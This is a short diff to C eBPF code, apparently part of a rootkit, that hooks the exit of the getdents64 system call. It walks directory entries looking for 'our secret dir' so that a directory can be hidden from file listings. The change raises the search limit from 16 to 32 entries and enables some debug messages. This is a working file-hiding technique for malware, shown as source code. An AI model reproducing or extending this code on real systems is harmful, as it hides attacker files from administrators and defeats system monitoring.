@@ -293,9 +293,9 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
     bpf_printk("Starting dirent search, max:%ld, base_addr: %lx\n", dir_buf_max, d_entry_base_addr);
     //We will proceed to iterate through the buffer and look for our secret dir until we are past the limit
     struct linux_dirent64* previous_dir = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
-    for(int ii=0; ii<16; ii++){
+    for(int ii=0; ii<32; ii++){
         if(curr_offset>=dir_buf_max){
-            bpf_printk("Finished dirent search because we reached the end\n");
+            bpf_printk("Finished dirent search because we reached the end: %ld\n", dir_buf_max);
             break;
         }
         struct linux_dirent64 *d_entry = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
@@ -309,7 +309,7 @@ static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_e
         if (err!=0){
             //Ignore this entry, error
             curr_offset += d_reclen;
-            //bpf_printk("Error reading directory name\n");
+            bpf_printk("Error reading directory name\n");
             continue;
         }
         //It is a directory, check if it is ours
